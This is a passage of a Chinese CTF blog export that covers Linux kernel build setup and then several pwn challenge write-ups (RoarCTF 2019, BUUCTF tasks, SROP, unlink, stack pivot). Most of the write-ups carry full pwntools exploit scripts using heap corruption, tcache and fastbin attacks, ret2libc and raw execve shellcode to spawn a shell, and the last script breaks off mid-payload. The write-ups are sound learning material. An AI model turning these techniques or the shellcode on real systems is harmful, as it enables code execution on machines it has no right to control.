    <content type="text"><![CDATA[好久没更新博客了，很大原因是因为网上有太多大师傅总结的都比较好，自己又太菜，能写出来的干货太少了。希望利用这个假期来学习一下linux kernel相关 内核编译安装所需要的依赖： 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 安装qemu及其依赖： 12$ sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev$ sudo apt-get install qemu 下载kernel源代码，我这里选择了linux-4.4.73版本 1234wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.73.tar.gztar -zxvf linux-4.4.73.tar.gzcd linux-4.4.73make menuconfig 在可选菜单里默认选项即可，直接保存，然后 1make bzImage 需要等待一段时间去编译，看到如下信息，基本就算是编译完成了在./arch/x86/boot/可以找到bzImage，从源码根目录找到vmlinux。ps:bzImage（Big zImage）是vmlinuz经过gzip压缩后的文件，适用于大内核vmlinux是未压缩的内核，是一个非压缩的，静态链接的，可执行的，不能bootable的Linux kernel文件。是用来生成vmlinuz的中间步骤。vmlinuz是vmlinux的压缩文件，是一个压缩的，能bootable的Linux kernel文件。vmlinuz是Linux kernel文件的历史名字，它实际上就是zImage或bzImagevmlinux 是ELF文件，即编译出来的最原始的文件。vmlinuz应该是由ELF文件vmlinux经过OBJCOPY后，并经过压缩后的文件zImage是vmlinuz经过gzip压缩后的文件，适用于小内核 添加syscall其实这部分内容在上学期的操作系统实验与课设中有过相关的学习和操作，只不过用的是linux0.11在内核源代码根目录下创建helloworld目录，并创建两个文件helloworld.c和Makefilehelloworld.c: 123456#include &lt;linux/kernel.h&gt;asmlinkage long sys_helloworld(void)&#123; printk("&#123;==kernel==&#125; hello world\n"); return 0;&#125; Makefile： 1obj-y=helloworld.o 然后返回根目录，编辑Makefile，添加helloworld/然后在include/linux/syscalls.h，添加函数原型 1asmlinkage long sys_helloworld(void); 编辑arch/x86/entry/syscalls/syscall_32,添加 11111 i386 helloworld sys_helloworld 编辑arch/x86/entry/syscalls/syscall_64,添加 11111 common helloworld sys_helloworld 注意这个要加在这行的上面 1# x32-specific system call numbers start at 512 to avoid cache impact 然后make bzImage编译内核 编译busybox根据维基上的定义：BusyBox是一个遵循GPL协议、以自由软件形式发行的应用程序。Busybox在单一的可执行文件中提供了精简的Unix工具集，可运行于多款POSIX环境的操作系统，例如Linux（包括Android[6]）、Hurd[7]、FreeBSD[8][9]等等。由于BusyBox可执行文件的文件大小比较小，使得它非常适合使用于嵌入式系统。作者将BusyBox称为“嵌入式Linux的瑞士军刀”busybox可在官网下载：https://busybox.net/将下载文件解压后，进入目录下 1make menuconfig 在setting里将Build static binary (no shared libs)勾选，然后执行编译 1make install -j4 然后进行相关的初始化工作 12345cd _installmkdir procmkdir systouch initchmod +x init 在init文件中写入下面内容： 123456789101112#!/bin/shecho &quot;&#123;==DBG==&#125; INIT SCRIPT&quot;mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp# insmod /xxx.ko # load komdev -s # We need this to find /dev/sda laterecho -e &quot;&#123;==DBG==&#125; Boot took $(cut -d&apos; &apos; -f1 /proc/uptime) seconds&quot;setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root init作用是内核初始化，insmod作用于将指定模块加载到内核中然后可以写一个如下脚本用来打包rootfs 1234#!/bin/shecho &quot;Generate rootfs.img&quot;cd busybox # fs folderfind . | cpio -o --format=newc &gt; ../rootfs.img 编译ko文件在内核源代码根目录下，创建ko目录编辑hello.c和Makefile文件hello.c: 123456789101112131415161718#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/cred.h&gt;MODULE_LICENSE("Dual BSD/GPL");struct cred c1;static int hello_init(void) &#123; printk("&lt;1&gt; Hello world!\n"); printk("size of cred : %d \n",sizeof(c1)); return 0;&#125;static void hello_exit(void) &#123; printk("&lt;1&gt; Bye, cruel world\n");&#125;module_init(hello_init);module_exit(hello_exit); Makefile： 1234567891011121314obj-m := hello.oKERNELDR := /home/focu5/linux-4.4.72PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 然后执行make编译hello.ko文件，并放到busybox的_install目录下 运行写一个程序来调用syscall，注意用静态编译 1234567//gcc test.c -static -o test#include &lt;unistd.h&gt;int main(void)&#123; syscall(1111); return 0;&#125; 将FileSystem打包成映像（此时应该将刚才编辑的init中xxx.ko改为刚才我们生成的hello.ko)执行find . | cpio -o --format=newc &gt; ./rootfs.img将生成的rootfs.img和编译的内核bzImage文件放在同一文件夹下，新建一个启动脚本boot.sh 123456789101112#!/bin/shqemu-system-x86_64 \-m 64M \-kernel ./bzImage \-initrd ./rootfs.img \-append &quot;root=/dev/ram rw oops=panic panic=1 kalsr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-monitor /dev/null \-smp cores=2,threads=1 \-cpu kvm64,+smep \#-S 启动gdb调试#-gdb tcp:1234 等待gdb调试 ./boot.sh运行即可]]></content>
      <tags>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Roarctf-2019]]></title>
    <url>%2F2019%2F10%2F17%2FRoarctf-2019%2F</url>
    <content type="text"><![CDATA[easy_pwn程序存在off by one可以借此进行chunk overlap，我采用了向上合并的方式，首先申请一个unsorted chunk0并free掉，中间申请一个可以off by one的unsorted chunk1，再申请一个unsorted chunk2，利用中间的chunk更改下一个chunk的size位尽量包含多个chunk， 然后当再次申请chunk0_size,可以使得main_arena在chunk1的fd位，show(1)可计算得到libc基址，然后add(chunk1_size),可以获得一个由两个指针同时指向的chunk1，可以劫持malloc_hook，注意的是再写one_gadget需要利用realloc平衡栈结构来执行execve(‘/bin/sh’,0,0) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level="debug"libc = ELF("./libc-2.23.so")p = process("./easy_pwn")#p = remote("39.97.182.233", 41078)def add(size): p.sendlineafter(": ", "1") p.sendlineafter(": ", str(size))def edit(idx, size, content): p.sendlineafter(": ", "2") p.sendlineafter(": ", str(idx)) p.sendlineafter(": ", str(size)) p.sendafter(": ", content)def free(idx): p.sendlineafter(": ","3") p.sendlineafter(": ", str(idx))def show(idx): p.sendlineafter(": ", "4") p.sendlineafter(": ", str(idx))def dbg(): gdb.attach(p) p.interactive()def exp(): add(0x80)#0 add(0x68)#1 add(0x80)#2 add(0x20)#3 add(0x20)#4 free(0) edit(1, 0x68+10, '\x00'*0x60+p64(0x100)+'\xc0') free(2) add(0x80)#0 show(1) libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2)-0x3c4b78 log.success("libc_base == &gt; " + hex(libc_base)) malloc_hook = libc_base + libc.sym['__malloc_hook']-0x23 realloc = libc_base + libc.sym['realloc'] add(0x68)#2 free(2) edit(1, 8, p64(malloc_hook)) add(0x68) add(0x68) edit(5, 0x18+3, 'aaa'+p64(0)+p64(libc_base+0xf1147)+p64(realloc+4)) #dbg() p.interactive()if __name__ == '__main__': exp() PS：看了其他师傅的wp，是用unsorted attack在free_hook上写出一个0x7f开头的数据来写free_hook为system realloc_magic没有输出函数且开启PIE，需要利用unsorted chunk踩出_IO_2_1_stdout_高位地址，然后1/16爆破其第低三位，修改_IO_write_base和flags泄露出libc基址。利用realloc的特性和uaf，overlap chunk，关键点是程序只有一次重置指针的机会，需要在改完IO FILE时使用，所以前面进行tcache attack时，修改其size位，使其下次free后进入其他size的tcache bins，不然因为tcache bin的后进先出永远申请不到目标位置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level = 'debug'elf = ELF("./roarctf_2019_realloc_magic")#p = elf.process()libc = ELF("./libc-2.27.so")def dbg(): gdb.attach(p) p.interactive()def re(size, content): p.sendlineafter("&gt;&gt; ", '1') p.sendlineafter("Size?", str(size)) p.sendafter("Content?", content)def fr(): p.sendlineafter("&gt;&gt; ", '2')def ba(): p.sendlineafter("&gt;&gt; ", '666')def exp(): global p p = remote("node3.buuoj.cn", 28467) re(0x80, 'a') re(0, '') re(0x90, 'b') re(0, '') re(0x20, 'b') re(0, '') re(0x90, 'a') for i in range(7): fr() re(0, '') re(0x80, 'a') re(0x110, '\x00'*0x88 + p64(0x51)+'\x60\xf7') re(0, '') re(0x90, 'a') re(0, '') try: re(0x90, p64(0xfbad1800)+p64(0)*3+'\x00') except: log.failure("not lucky enough!") p.close() return False libc_base = u64(p.recvuntil("\x7f", timeout=0.5)[-6:].ljust(8,'\x00'))-0x3ed8b0 if libc_base&amp;0xFF!=0x00: log.failure("not lucky enough!") p.close() return False log.success('libc_base ==&gt; ' + hex(libc_base)) ba() re(0x120, '\x00'*0x88+p64(0x61)+p64(libc_base+libc.sym['__free_hook'])) re(0, '') re(0x40, 'a') re(0, '') re(0x40, p64(libc_base+libc.sym['system'])) re(0, '') re(0x20, '/bin/sh\x00') fr() p.interactive()while not exp(): passif __name__ == '__main__': exp()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记录一下在buuctf刷的几个pwn题]]></title>
    <url>%2F2019%2F09%2F13%2Fbuuctf-pwn%2F</url>
    <content type="text"><![CDATA[babyheap_0ctf_2017申请几个fast chunk和一个unsorted chunk, 释放两个fast chunk，改变第一个chunk的fd值为unsorted chunk地址，且需要将其size位改为0x21，为的是过掉检测： 1234567if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))&#123; errstr = "malloc(): memory corruption (fast)";errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL;&#125; 查看其 chunksize 与相应的 fastbin_index 是否匹配，实际上 chunksize 的计算方法是 victim-&gt;size &amp; ~(SIZE_BITS))，而它对应的 index 计算方法为 (size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 (size &gt;&gt; 4) - 2，那么我们将 small chunk 的 size 域改写成 0x21 即可。两次alloc申请到unsorted chunk，使得第二个指针也指向他，此时再将他的size改回来，free掉即可通过show(1)来leak libc babyfengshui_33c3_2016参照https://firmianay.gitbooks.io/ctf-all-in-one/doc/6.1.20_pwn_33c3ctf2016_babyfengshui.html题目主要是通过(store[i]-&gt;desc + test_size) &lt; (store[i] - 4)来检测堆溢出，那么可以通过先创建两个user，free掉第一个，使其description和name合并为一个unsorted chunk，再申请一个大小为合并后chunk的大小的description，此时即可绕过检测进行堆溢出然后就是经典操作将user2的description改为free_got，泄露libc基址，在修改指针，使得free_got为system，构造chunk即可执行system(“/bin/sh”)exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *context.log_level = 'debug'#p = process('./babyfeng')elf = ELF("./babyfeng")p = remote('pwn.buuoj.cn', 20002)libc = ELF("./x86_libc.so.6")#libc = ELF("./libc-2.23.so")if args.G: gdb.attach(p)def add(nsize, name, dsize, des): p.recvuntil("Action: ") p.sendline("0") p.recvuntil("description: ") p.sendline(str(nsize)) p.recvuntil("name: ") p.sendline(name) p.recvuntil("text length: ") p.sendline(str(dsize)) p.recvuntil("text: ") p.sendline(des)def free(idx): p.recvuntil("Action: ") p.sendline("1") p.recvuntil("index: ") p.sendline(str(idx))def show(idx): p.recvuntil("Action: ") p.sendline("2") p.recvuntil("index: ") p.sendline(str(idx))def edit(idx, size, text): p.recvuntil("Action: ") p.sendline("3") p.recvuntil("index: ") p.sendline(str(idx)) p.recvuntil("text length: ") p.sendline(str(size)) p.recvuntil("text: ") p.sendline(text)def exp(): add(0x80,'a',0x80,'a') add(0x80, 'b', 0x80, 'b') add(0x10, '/bin/sh\x00', 0x10, '/bin/sh\x00') free(0) add(0x100, 'a', 0x19c, 'a'*0x198 + p32(elf.got['free'])) show(1) p.recvuntil("description: ") free_addr = u32(p.recv(4)) log.success("free_addr isa " + hex(free_addr)) libc_base = free_addr - libc.sym['free'] system_addr = libc_base + libc.sym['system'] edit(1, 4, p32(system_addr)) log.success("system_addr is " + hex(system_addr)) log.success("libc_base is " + hex(libc_base)) free(2) p.interactive()if __name__ == '__main__': exp() ciscn_final_3难点在于leak libc环境为libc.2.27含tcache，无法申请到unsorted chunk，先通过gift得到第一块的堆地址，然后利用tcache attack double free到第一块，修改size利用堆重叠使其进入unsorted bin分割chunk至tcache chunk使其fd指向main_arena附近，再次申请chunk通过gift，即可leak libc ez_pz_hackover_2016‘\x00’过掉strlen，ret2libc 123456789101112131415161718192021222324from pwn import *context.log_level = 'debug'#p = process("./ez_pz_hackover_2016")p = remote("pwn.buuoj.cn", 20040)elf = ELF("./ez_pz_hackover_2016")libc = ELF("x86_libc.so.6")if args.G: gdb.attach(p)chall = 0x8048603p.recvuntil("&gt; ")payload = 'crashme\x00' + 'a' * (0x32-8-0x14-4) + p32(elf.plt['printf']) + p32(chall) + p32(elf.got['printf'])p.sendline(payload)p.recvline_startswith('Welcome')printf_addr = u32(p.recv(4))log.success("printf_addr ==&gt; " + hex(printf_addr))libc_base = printf_addr - libc.sym['printf']log.success("libc_base ==&gt; " + hex(libc_base))system_addr = libc.sym['system'] + libc_basebinsh_addr = libc.search("/bin/sh").next() + libc_basepayload = 'crashme\x00' + 'a' * (0x32-8-0x14-4) + p32(system_addr) + p32(0) + p32(binsh_addr)p.sendline(payload)p.interactive() ciscn_2019_en_3123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = 'debug'elf = ELF("./ciscn_2019_en_3")p = elf.process()libc = ELF("./libc-2.27.so")#p = remote("")def dbg(): gdb.attach(p) p.interactive()def add(size, content): p.sendlineafter("choice:", '1') p.sendlineafter("of story: \n", str(size)) p.sendafter("the story: \n", content) def free(idx): p.sendlineafter("choice:", '4') p.sendlineafter("index:\n", str(idx))def exp(): p.sendlineafter("name?\n", 'a') p.sendafter("ID.\n", 'a'*8)#利用read后面不补0的特性，泄露栈上数据，leak libc libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x81237 log.success("libc_base ==&gt; " + hex(libc_base)) free_hook = libc_base + libc.sym['__free_hook'] system = libc_base + libc.sym['system'] binsh = libc_base + libc.search('/bin/sh').next() add(0x20,'a')#0 add(0x20,'/bin/sh\x00')#1 free(0) #double free free(0) add(0x20, p64(free_hook)) add(0x20,'a') add(0x20, p64(system)) free(1) p.interactive()if __name__ == '__main__': exp() ciscn_2019_es_1libc-2.27 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context.log_level = 'debug'elf = ELF("./ciscn_2019_es_1")p = elf.process()libc = ELF("./libc-2.27.so")#p = remote("")def dbg(): gdb.attach(p) p.interactive()def add(size, name, call): p.sendlineafter("choice:", '1') p.sendlineafter("compary's name\n", str(size)) p.sendafter("name:\n", name) p.sendlineafter("call:\n", call)def show(idx): p.sendlineafter("choice:", '2') p.sendlineafter("index:\n", str(idx))def free(idx): p.sendlineafter("choice:", '3') p.sendlineafter("index:\n", str(idx))def exp(): for i in range(9): add(0x80, '/bin/sh', 'call') for i in range(8): free(i) show(7) libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00\x00')-0x3ebca0 log.success("libc_base ==&gt; " + hex(libc_base)) free_hook = libc_base + libc.sym['__free_hook'] system = libc_base + libc.sym['system'] add(0x20, 'a', 'a') free(9) free(9) add(0x20, p64(free_hook), 'a') add(0x20, 'a', 'a') add(0x20, p64(system), 'a') free(8) p.interactive()if __name__ == '__main__': exp() libc-2.23 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *context.log_level = 'debug'elf = ELF("./ciscn_2019_es_1")p = elf.process()libc = ELF("./libc-2.23.so")#p = remote("")def dbg(): gdb.attach(p) p.interactive()def add(size, name, call): p.sendlineafter("choice:", '1') p.sendlineafter("compary's name\n", str(size)) p.sendafter("name:\n", name) p.sendlineafter("call:\n", call)def show(idx): p.sendlineafter("choice:", '2') p.sendlineafter("index:\n", str(idx))def free(idx): p.sendlineafter("choice:", '3') p.sendlineafter("index:\n", str(idx))def exp(): add(0x80, 'a', 'a')#0 add(0x20, 'b', 'b')#1 free(0) show(0) libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00\x00')-0x3c4b78 log.success("libc_base ==&gt; " + hex(libc_base)) malloc_hook = libc_base + libc.sym['__malloc_hook'] realloc = libc_base + libc.sym['realloc'] system = libc_base + libc.sym['system'] one =libc_base + 0x4526a add(0x60, 'a', 'a')#2 add(0x60, 'b', 'b')#3 free(2) free(3) free(2) add(0x60, p64(malloc_hook-0x23), 'a') add(0x60, 'a','a') add(0x60, 'a', 'a') add(0x60, '\x00'*11+p64(one)+p64(realloc+0x10), 'b') dbg() p.interactive()if __name__ == '__main__': exp() ciscn_2019_final_2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#修改stdin_fileno为指定fd来获取flag# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process("ciscn_final_2")elf = ELF("ciscn_final_2")libc = ELF("./libc-2.27.so")if args.G: gdb.attach(p)def add(typ, num): p.recvuntil("&gt;") p.sendline("1") p.recvuntil("&gt;") p.sendline(str(typ)) p.recvuntil(":") p.send(str(num))def show(typ): p.recvuntil("&gt;") p.sendline("3") p.recvuntil("&gt;") p.sendline(str(typ))def free(typ): p.recvuntil("&gt;") p.sendline("2") p.recvuntil("&gt;") p.sendline(str(typ))def exp(): add(1, 0x30)#0 add(2, 0x20)#1 add(2, 0x20)#2 add(2, 0x20)#3 free(1) add(2, 0x20)#4 free(2) add(1, 0x30) free(2) show(2) p.recvuntil(":") chunk0_addr = int(p.recvline().strip()) - 0xa0 log.success("chunk0_addr ==&gt; " + hex(chunk0_addr)) add(2, chunk0_addr) add(2, 0) add(2, 0x91) for _ in range(7): free(1) add(2, 0x91) free(1) show(1) p.recvuntil(":") main_arena = int(p.recvline().strip()) -96 libc_base = main_arena - libc.sym['__malloc_hook'] - 0x10 log.success("libc_base ==&gt; " + hex(libc_base)) io_stdin = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x70 add(1, io_stdin) #这道题这能写fd低位，正好利用main_arena的高位 add(1, 0x30) free(1) add(2, 0x20) free(1) show(1) p.recvuntil(":") chunk0_fd = int(p.recvline().strip()) -0x30 add(1, chunk0_fd) add(1, 0) add(1, 0) add(1, 666) p.recvuntil("&gt;") p.sendline("4") print p.recvuntil("received...\n") p.interactive() if __name__ == '__main__': exp()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出进阶——srop]]></title>
    <url>%2F2019%2F09%2F13%2Fsrop%2F</url>
    <content type="text"><![CDATA[srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图 这个是根据ctf-wiki上的exp构造的栈空间的流程，可以发现大概利用流程就是通过read读入字节数的返回值修改rax，再将sigframe结构体写入栈中，再通过read读取syscall至返回地址，拼接字节使其返回值为15，从而执行sigreturn，又因为sigframe设置rip为syscall再次调用,执行execve(‘/bin/sh’,0,0)由于直接将返回值改为syscall,会破坏rsp，无法继续read sigframe,所以采用两次读取sigframe，第一次目的是将rsp置为原址，并将返回地址main和第二个sigframe读入栈中，然后回到main执行read(0,rsp,0x400)，置rax为15，即可getshell注意：一定要加上context.arch = ‘amd64’，关系到SigreturnFrame()的内容 接下来是实战了一道例题：ciscn_2019_es_7，buuoj上有题目复现其中提供了方便利用的gadget 12345678910111213.text:00000000004004ED ; __unwind &#123;.text:00000000004004ED push rbp.text:00000000004004EE mov rbp, rsp.text:00000000004004F1 xor rax, rax.text:00000000004004F4 mov edx, 400h ; count.text:00000000004004F9 lea rsi, [rsp+buf] ; buf.text:00000000004004FE mov rdi, rax ; fd.text:0000000000400501 syscall ; LINUX - sys_read.text:0000000000400503 mov rax, 1.text:000000000040050A mov edx, 30h ; count.text:000000000040050F lea rsi, [rsp+buf] ; buf.text:0000000000400514 mov rdi, rax ; fd.text:0000000000400517 syscall ; LINUX - sys_write 1234567891011.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh ;修改rax为0xf 可执行sigreturn.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2 mov rax, 3Bh ;修改rax为0x3b 可执行execve.text:00000000004004E9 retn 由于这道题不知道怎么使用execve，就直接运用sigreturn来做了主要利用过程就是先得到栈地址，由于返回地址要覆盖成read，所以只能找到一个栈空间下面的一段偏移，题目未开启pie则可以通过计算找到binsh字符串，然后就是写入sigframe，再利用给的gadget将rax设置为15即可exp如下： 12345678910111213141516171819202122232425262728293031323334from pwn import *#p = process('./ciscn_2019_es_7')p = remote('pwn.buuoj.cn', 20179)if args.G: gdb.attach(p)context.arch = 'amd64'context.log_level = 'debug'gadget = 0x4004dasyscall_ret = 0x400517read = 0x4004edpayload = 'a' * 16 + p64(read)p.send(payload)p.recvn(32)stack_addr = u64(p.recvn(6)+'\x00'*2)log.success('leak stack addr :' + hex(stack_addr))## call execv("/bin/sh",0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280 # "/bin/sh" 's addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = '/bin/sh\x00' + p64(0) + p64(gadget) + p64(syscall_ret) + str(sigframe)print len(frame_payload)payload = frame_payload p.send(payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvisoj-level6_x64-实战unlink利用]]></title>
    <url>%2F2019%2F08%2F18%2Fjarvisoj-pwn-freenote-x64%2F</url>
    <content type="text"><![CDATA[这道题算是自己独立完成的第一个堆利用题，比较有纪念意义拿到题，IDA加载后分析源码，存在一个bss段信息存放着有关的堆信息，通过gdb调试发现其存放着堆信息索引的地址注意是指向索引的指针，如果是索引本身那么直接unlink到bss段即可 调试发现，索引也为一个chunk，是变化的，但可以通过leak heap计算得来heap地址泄露的原理为：当两个不相邻的chunk被free掉时，会置于bin的链表中，本例中会先放到unsorted bin中，这时chunk的fd和bk中存有chunk的地址信息首先建立五个chunk，然后free掉两个不相邻的，其中chunk0的作用用来溢出到chunk1的fd部分之前来泄露fd（chunk3地址）的内容，chunk4的作用则是chunk3被free时与top chunk合并 1234567new('a'*0x80) #0new('b'*0x80) #1new('c'*0x80) #2new('d'*0x80) #3new('e'*0x80) #4 free(3)free(1) 此时gdb调试堆情况如下通过上张调试图片可以发现chunk1的bk部分存放着main_arena+88的地址，接下来可以藉此leak libclibc地址泄露的具体原理为： 1. 由于在写入的时候没有加上\x00，所以在输出的时候可以也一直输出到之后的\x00为止。 2. 当chunk被free掉后fd和bk指针会的值为&lt;main_arena+offset&gt;，而&lt;main_arena+offset&gt;与libc加载地址的相对偏移是固定的。所以只需要泄露出&lt;main_arena+offset&gt;，再在本地调试找到算出libc和main_arena的偏移，便能知道libc的基址不同libc版本，其main_arena偏移地址可通过malloc_trim找到：接下来即可在chunk0下面伪造fake chunk使其fd为heap_head-0x18,bk为heap_head-0x10，unlink原理网上很多就不再写了，稍微总结一下unlink的理解unlink在构造fake chunk时候要绕过两个函数 12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P, AV); 12if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); 绕过第一个函数，需要找到一个位置指向堆地址，即*P = X，通常P为一个note的索引绕过第二个函数，需要溢出到下一个chunk的prev_size位，使其等于fake chunk的size，同时size位的最低为要为0成功unlink后，P可以指向P-0x18，可以配合edit free等功能实现任意读写因为此题未开启FULL RELRO，可改变got表为system实现get shell，不然要通过写free_hook或者malloc_hook完整exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context.log_level = 'debug'p = process("./freenote")#p = remote("pwn2.jarvisoj.com", 9886)elf = ELF('./freenote')libc = ELF('libc-2.19.so')#libc = ELF('libc.so.6')if args.G: gdb.attach(p)def new(payload): p.recvuntil("choice: ") p.sendline("2") p.recvuntil("new note: ") p.sendline(str(len(payload))) p.recvuntil("your note: ") p.send(payload)def show(): p.recvuntil("choice: ") p.sendline("1")def edit(idx, payload): p.recvuntil("choice: ") p.sendline("3") p.recvuntil("number: ") p.sendline(str(idx)) p.recvuntil("of note: ") p.sendline(str(len(payload))) p.recvuntil("your note: ") p.send(payload)def free(idx): p.recvuntil("choice: ") p.sendline("4") p.recvuntil("number: ") p.sendline(str(idx))def exp(): new('a'*0x80) #0 new('b'*0x80) #1 new('c'*0x80) #2 new('d'*0x80) #3 new('e'*0x80) #4 #leak heap free(3) free(1) edit(0, 'a'*0x90) show() p.recvn(0x93) heap_head = u64(p.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x19d0 log.success('heap_head is ' + hex(heap_head)) #leak libc edit(0, 'a'*0x98) show() p.recvn(0x93 + 0x8) main_arena = u64(p.recvn(6).ljust(8, '\x00')) log.success("main_arena is " + hex(main_arena)) libc_base = main_arena - 88 - 0x3c2760 system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search('/bin/sh').next() #unlink payload = p64(0) + p64(0x80) + p64(heap_head + 0x30 - 0x18) + p64(heap_head + 0x30 - 0x10) payload = payload.ljust(0x80, 'a') payload += p64(0x80) + p64(0x90) free(0) new(payload) free(1) payload = p64(2) + p64(1) + p64(8) + p64(elf.got['free']) + p64(0)*2 + p64(binsh_addr) payload = payload.ljust(0x90, 'a') edit(0, payload) edit(0, p64(system_addr)) free(1)exp()p.interactive() 通过这道题对堆利用的题有了初步的认识，接下来要努力学习堆内存管理的机制。PS：常见的unlink利用是通过off-by-one null byte使下一个chunk的size低位为0，然后free实现unlink]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道pwn题学习c和python混合编程]]></title>
    <url>%2F2019%2F08%2F04%2FQCTF2018-pwn-dice-game%2F</url>
    <content type="text"><![CDATA[QCTF2018-pwn-dice_game拿到文件，首先IDA分析发现read函数，但长度限制在0x50，buf位于rbp-0x50处，且有截断，无法直接溢出到rip 发现srand函数，其通过参数seed改变系统提供的种子值，可以使得每次调用rand函数生成的伪随机数序列不同，从而实现真正意义上的“随机”此题通过rand函数生成数字，每次与输入对比，50次全部猜对即可获得flag通过查看栈上buf和seed的位置关系，发现可以通过溢出覆盖seed值但是要想利用就需要利用libc中的函数，通过查找资料发现一个可以在python中调用c语言函数库的办法，实现python和c混合编程python一个库——ctypes，使用cdll.LoadLibrary即可加载dll并取出函数完整exp如下： 123456789101112131415from pwn import *from ctypes import *libc = cdll.LoadLibrary('libc.so.6')#p = process('./dice_game')p = remote('111.198.29.45', 51234)payload = 'a' * 0x40 + p64(1)p.sendlineafter('name:', payload)for _ in range(50): num = libc.rand() % 6 + 1 p.sendlineafter('(1~6):', str(num))p.interactive() 继续学习ctypes库，学习到很多有意思的东西： 123456789i = c_int(42)print 'before, i.value =', i.valuepi = pointer(i)pi[0] = 57print 'after, i.value =', i.value # create NULL pointer, also can use this way, but recommend use 'pointer' not 'POINTER'null_ptr = POINTER(c_int)()print 'bool(null_ptr) =', bool(null_ptr) 即通过关键字pointer可以使用指针还有其他方法，参考资料：https://www.cnblogs.com/gaowengang/p/7919219.html]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-安恒19年7月赛-pwn]]></title>
    <url>%2F2019%2F07%2F30%2F2019-7-pwn-unexploit%2F</url>
    <content type="text"><![CDATA[unexploit IDA打开，发现危险函数read造成栈溢出 checksec查看保护发现未开启NX，但是由于buf位于rbp-0x8处，且read限制读取0x20字符，需要用栈迁移的办法构造payload，从而控制程序流程执行shellcode首先构造payload1将栈迁移至bss段 1payload1 = 'a' * 8 + p64(bss - 0x8) + p64(read_addr) + p64(0xdeadbeef) 执行完read函数，通过leave和ret指令，使得rbp指向bss-0x8处，而rip指向read_addr，使得程序再次执行read函数继续构造payload2 1payload2 = 'a' * 8 + p64(bss + 0x8) + p64(read_addr) + p64(0xdeadbeef) 此次指向完毕，rsp和rbp会指向同一处:bss+8，而rip指向bss处的read函数，这样再次执行read的话，会先将read的下一条指令的地址压入栈中图上可以看到call read之前会push下一条指令，则rsp-4指向bss地址，而read将bss+8读入bss处修改了read的返回地址，执行完read之后来到bss+8，此时bss+8刚好是shellcode 1payload3 = p64(bss + 0x8) + shellcode 最终exp 12345678910111213141516171819from pwn import *#context.log_level = 'debug'p = process('./unexploit')elf = ELF('./unexploit')#gdb.attach(p)read_add = 0x40068abss_addr = elf.bss()shellcode = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'payload1 = 'a' * 8 + p64(bss_addr - 0x8) + p64(read_add) + p64(0xdeadbeef)payload2 = 'a' * 8 + p64(bss_addr + 0x8) + p64(read_add) + p64(0xdeadbeef)payload3 = p64(bss_addr + 0x8) + 